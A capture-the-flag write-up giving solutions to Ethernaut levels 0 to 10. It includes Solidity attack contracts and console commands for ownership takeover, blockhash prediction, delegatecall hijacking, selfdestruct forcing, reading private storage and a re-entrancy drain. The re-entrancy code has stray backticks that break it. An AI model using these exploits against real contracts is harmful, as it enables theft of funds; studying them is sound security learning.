# Ethernaut-Solution

Here I am uploading the solutions to the Ethernaut Challenges to which the link is given below

https://ethernaut.openzeppelin.com/

## 0) **Hello Ethernaut**

This challenge is created to make you familiar with the interface. Here you will learn about the commands that will be helpful while playing the CTF. At this level you will also be setting up the Metamask. Once you are done with all these steps you have to find the passkey that you have to enter to pass this challenge. Also you have to find out the method using which you have to submit the passkey and if you have followed the ninth step then you must be having it.And still if you do not have the method name then below commands will lead you to the method name.

a) ```await contract.info()```<br/>
b) ```await contract.info1()```<br/>
c) ```await contract.info2("hello")```<br/>
d) ```await contract.infoNum()```<br/>
e) ```await contract.info42()```<br/>
f) ```await contract.theMethodName()```<br/>
g) ```await contract.method7123949()```<br/>


Now to get the passkey below is the solution

First enter the ```contract.abi``` command that helps you interact with the deployed code and come to know about it's functions. When going through the result of the above command you must have find the 'password' method, that will return the passkey to solve the challenge. So enter the ```await contract.password()``` command and you will find the passkey.

Now you have both method name and the passkey. Go and submit the passkey and the challenge will get completed.

## 1) **Fallback**

From the name of the challenge, you can easily interpret that it's related to fallback function.The challenge requires us to claim the ownership of the contract and reduce it's balance to 0.

In this contract we can claim the ownership of the contract using two functions:<br/>
a) contribute<br/>
b) receive()<br/>

In order to claim ownership using ```contribute()``` function, you will require large amount of ethers.So that's not practically possible and also it's require statement will revert the transaction, even if you send the required ethers.The only way left is using ```receive()``` function.This function will get executed on calls to the contract with no data (calldata), e.g. calls made via ```send()``` or ```transfer()```.
But it also have prerequisite that the contributer must be having some of there balance in the contract.

For this we will first call ```contribute()``` function with 0.00001 ether(because amount should be less than 0.001 ether) using javascript console(Press Ctrl+Shift+I in windows)

```contract.contribute({value:"10000000000000"})```

Then we will use send method to trnasfer some ethers to the contract

```contract.send("10000000000000")```

Now you must be the owner of the contract if you have followed the above solution properly.You can check it by using the following command

```await contract.owner()```

Now to withdraw the entire balance use withdraw function.

```await contract.withdraw()```

Hurray!!! The Challenge have been completed.

## 2) **Fallout**

This is one of the easiest challenge among all. It just need good observation power to solve the challenge.

In the previous versions of solidity constructor was defined with the same name as of the contract and that's where the developer have done the mistake.

The spelling of constructor name is wrong because of which it's no longer a constructor but a normal function that can be called by anyone.

By calling this function we can gain the ownership of the given contract.The command for the same is

```contract.Fal1out()```

## 3) **Coin Flip**

This challenge exploits the blockchain’s inability to generate pseudo random number. In this challenge we have to predict the output which is based on previous blockhash.The following contract can be used to exploit the challenge.

```
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;
 
contract coinflip_solutions{
    address victim = <<Instance Address>>;
    uint factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
    function solve() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / factor;
        bool side = coinFlip == 1 ? true : false;
 
        bytes memory payload = abi.encodeWithSignature("flip(bool)",side);
        (bool success, ) = victim.call(payload);
        require(success, "Transaction submitted");
    }
}
```

In the above contract the first three lines of solve function is used to compute the answer. In the next line we have created a function signature to submit the answer. Then the transaction is being called  with the help of call method.<br/>
This challenge also ensures that no consecutive blockhash are same.So while calling the solve function make sure that there is some time difference, otherwise transaction will get reverted.

## 4) **Telephone**

This challenge will be solved by calling the ```changeOwner()``` function from another contract because require statement states that ```tx.origin``` should not be equal to ```msg.sender```.Below is the attack contract

```
//SPDX-License-Identifier:MIT
 
pragma solidity ^0.8.0;
 
contract telephone_solution{
 
    address victim = <<instance address>>;
    address new_owner = <<your address>>;
 
    function solve() public{
 
        bytes memory payload = abi.encodeWithSignature("changeOwner(address)",new_owner);
        (bool success, ) = victim.call{value: 0 ether}(payload);
        require(success, "Transaction successful");
 
    }
}
```

In the above contract, the first statement of ```solve()``` function creates a function signature. In the next statement the ```changeOwner()``` function is being called using call method.

This challenge explains the difference between ```tx.origin``` and ```msg.sender```.The ```tx.origin``` refers to the address, from which the transaction has been originated and it can never be a contract address while ```msg.sender``` gives the immediate previous address form which the transaction has passed over.For example 

A -> B -> C

In the above case, at point C ```msg.sender``` will be B and ```tx.origin``` will be A.

## 5) **Token**

The contract at this level is vulnerable to a very well known integer overflow vulnerability. It is also among the some of the easiest challenges of this CTF.You just need to transfer more than the available tokens from the contract and you will be having a very large amount of tokens corresponding to your address.

Every integer data type have certain range that it can store. In solidity, while performing mathematical operation if that range gets crossed then instead of throwing error it will again start the count either from start or end depending on the operation.

## 6) **Delegation**

This challenge exploits the delegatecall method in solidity. First we need to undersatnd what is delegatecall.

A delegatecall is a method in solidity that allows to execute the logic of some another contract on the state of the calling contract. By state I mean storage and attributes like ```msg.sender```, ```msg.value``` , ```msg.data``` etc.

We need to call the ```pwn()``` function using the fallback function which will set the owner to our address. For doing the same we first need to calculate the function hash using the following command

```
let payload = web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
});

```

Then we will send the transaction using the following command that will execute the fallback function

```
await sendTransaction({
  from: <Contract Address>,
  to: <Instance Address>,
  data: payload
});
```

Now you will see the owner will be set to your address

```
await contract.owner()
```
## 7) **Force**

In this challenge, we need to make the balance of contract greater than zero.But you must be thinking that there is no such function which can receive the ether so, how is it possible.
One way we can forcefully send ether to the contract is using ```selfdestruct()```.We will create the contract which will be storing some ethers into it and it will also be having ```selfdestruct()``` function. When we will call the ```selfdestruct()``` function the contract will get destroyed and it's ethers will be transferred to the victim contract. The attack contract is given below.

```
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;
 
contract force_solution{
    constructor() payable{
        require(msg.value==0.01 ether);
    }
 
    function attack() public payable {
        address force = <Instance Address>;
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}
```

In the above contract, the constructor is having the require statement to ensure that the attack contract should contain some ether.In the attack function we have called the ```selfdestruct()``` function to destroy the contract and transfer the ether to our victim contract.This will make the balance of victim contract 0.01 ether.


Note :- Make sure that while deploying the attack contract you have sent 0.01 ether. Otherwise the contract will not get deployed.  

## 8) **Vault** 

This challenge requires us to set the '''locked''' variable as false.

In blockchain nothing can be private. Even the variables that are declared private can also be accessed.And this is the point where developer have done a mistake. 

In the victim contract password is declared as a private variable. You can easily look into it’s content using the following command.

```
const _password = await web3.eth.getStorageAt(instance, 1);
```

The victim contract have ```unlock()``` function that requires you to enter the correct password which will turn '''locked''' variable to false.Now call the unlock function using the following command

```
await contract.unlock(_password)
```

## 9) **King**

This challenge requires us to claim the kingship in such a manner that no one can again claim the kingship back.

If you have read the contract carefully then you must have noticed that whenever kingship is claimed then the previous king is transferred the amount of ether new king have sent. We can create a contract that reverts the transaction whenever any ether is sent by putting revert method in fallback function.Below is the attack contract:-

```
// SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;
 
contract king_solution{
    constructor(address king) payable{
        address(king).call{value:0.1 ether}("");
    }
 
    fallback() external payable {
        revert("Cannot claim king position");
    }
}
```

The constructor in above contract is sending the ether to the victim contract to claim the kingship of the victim contract.

## 10) **Re-entrancy**

As the name suggest the contract at this level is vulnerable to re-entrancy attack.Re-entrancy is one of the most well-known vulnerability which lead to one of the largest DAO Attack in the history of DApps.

The goal of this challenge is to withdraw all the funds from the contract.The '''withdraw()''' function is vulnerable to re-entrancy as it first transfers the ether and then update the balance.When ether is transferred to our contract we can again call the '''withdraw()''' function before the balance is updated.And this chain will continue, until the balance of contract becomes zero.Whatever I have explained above have been implemented in the below contract using the ```receive()``` function in the end.

```
// SPDX-License-Identifier:MIT
pragma solidity 0.8.0;
 
contract Reentrancy_solution{
   
    address public owner;
    address payable public victim;
    uint target_amount = 0.001 ether;
 
    constructor(address payable _victim) {
        owner = ```msg.sender```;
        victim = _victim;
    }
 
    function deposit() public payable{
        require(msg.value >= target_amount);
        bytes memory payload = abi.encodeWithSignature("donate(address)",address(this));
        (bool success,) = victim.call{value:target_amount}(payload);
        require(success, "Donation Successfull");
    }
 
    function malicious_withdraw() public {
        bytes memory payload = abi.encodeWithSignature("withdraw(uint256)",target_amount);
        (bool success, ) = victim.call(payload);
        require(success,"Withdraw Successfull");
    }
 
    function withdraw() public{
        require(```msg.sender``` == owner);
        payable(```msg.sender```).transfer(address(this).balance);
    }
 
    receive() external payable{
        uint victim_balance = victim.balance;
        if(victim_balance>=target_amount){
            malicious_withdraw();
        }
    }
}
```

Whenever the ethers will be transferred by the victim contract to our attack contract the ```receive()``` function will get evoked which will again call 
```malicious_withdraw()``` function.The deposit() function is to send some ethers to victim contract and the ```withdraw()``` function is to transfer the balance to your address.

